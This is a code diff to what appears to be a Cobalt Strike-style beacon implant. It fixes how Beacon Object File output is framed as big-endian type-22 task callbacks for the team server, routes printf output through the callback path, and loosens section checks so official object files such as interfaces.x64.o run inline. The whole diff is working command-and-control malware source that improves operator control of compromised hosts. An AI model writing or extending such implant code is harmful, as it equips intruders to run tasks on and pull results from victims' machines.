@@ -43,6 +43,8 @@
 #define SYMBOL_BSS           1031
 
 
+static void postmsg(int type, char * msg, int len);
+
 static void postmsgf(int type, char * fmt, ...) {
 	va_list va;
 	int     est;
@@ -66,8 +68,10 @@ static void postmsgf(int type, char * fmt, ...) {
 	vsprintf_s(buff, est+1, fmt, va);
 	va_end(va);
 
-	/* post it */
-	command_shell_callback(buff, est, type);
+	/* post it - THROUGH postmsg: BeaconPrintf must honor g_obj_callback
+	 * (object-task outputs route to the operator callback as type 22);
+	 * the old direct send bypassed it and leaked task output to console */
+	postmsg(type, buff, est);
 
 	/* clear&free our memory */
 	memset(buff, 0, est);
@@ -90,7 +94,7 @@ static BOOL use_token_a(HANDLE token) {
 
 /* callback id captured from an official BeaconObjectTask (4.9.1
  * beacons.task_ipconfig and friends): while non-zero, object output is sent
- * as type-22 task-callback frames ([u32 LE id][data]) so the TS routes it to
+ * as type-22 task-callback frames ([u32 BE id][data]) so the TS routes it to
  * the waiting operator callback instead of the beacon console */
 static int g_obj_callback = 0;
 
@@ -102,10 +106,14 @@ static void postmsg(int type, char * msg, int len) {
 			command_shell_callback(msg, len, type);
 			return;
 		}
-		blob[0] = (char)(id & 0xFF);
-		blob[1] = (char)((id >> 8) & 0xFF);
-		blob[2] = (char)((id >> 16) & 0xFF);
-		blob[3] = (char)((id >> 24) & 0xFF);
+		/* BIG-endian: the TS frame parser reads the id with DataInput
+		 * readInt() (BE) - the old LE packing mismatched and either hit
+		 * "has no pending request" or silently fell into the negative-id
+		 * default branch (2026-11-03) */
+		blob[0] = (char)((id >> 24) & 0xFF);
+		blob[1] = (char)((id >> 16) & 0xFF);
+		blob[2] = (char)((id >> 8) & 0xFF);
+		blob[3] = (char)(id & 0xFF);
 		memcpy(blob + 4, msg, len);
 		command_shell_callback(blob, len + 4, 22); /* 22 = task-callback output */
 		memset(blob, 0, len + 4);
@@ -1489,11 +1497,16 @@ void command_inline_execute_object(char * buffer, int length) {
 		if (p.length != 0) ok491 = FALSE;
 		if (ar491.length != 4) ok491 = FALSE;
 		if (c491.length == 0 || (DWORD)c491.length <= entry491) ok491 = FALSE;
-		if (rd491.length == 0 || rl491.length == 0) ok491 = FALSE;
+		/* rd/rl MAY be empty: official interfaces.x64.o has no .rdata section
+		 * at all (2026-11-03) - the old non-empty requirement made every
+		 * task_ipconfig fall into the legacy BOF path and the result never
+		 * reached the operator callback. */
 		spawn_log("cmd100 official ok491=", (long)ok491);
 		spawn_log("cmd100 c_len=", (long)c491.length);
 		spawn_log("cmd100 args_len=", (long)ar491.length);
 		spawn_log("cmd100 entry=", (long)entry491);
+		spawn_log("cmd100 rd_len=", (long)rd491.length);
+		spawn_log("cmd100 rl_len=", (long)rl491.length);
 
 		if (ok491) {
 			formatp rep;
